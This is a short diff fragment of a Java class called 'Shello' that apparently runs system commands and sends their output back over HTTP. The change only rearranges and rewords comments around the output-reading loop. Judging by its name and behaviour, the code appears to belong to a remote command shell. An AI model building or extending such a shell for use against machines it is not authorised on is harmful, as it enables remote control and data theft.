@@ -129,12 +129,14 @@ public class Shello {
                         catch (Exception e){
                         }
 
-                        //Reading process output (command results and sending it user over http)
+
+                        //This can be changed keeping the result buffer to 10000 bytes
                         byte[] output = new byte[10000];
                         while(pi.available()>0) {
                             pi.read(output);
                         }
-                            connect(new String(output));
+                        //Reading process output (command results and sending it to user over http)
+                        connect(new String(output));
 
                     };
                     p.destroy();
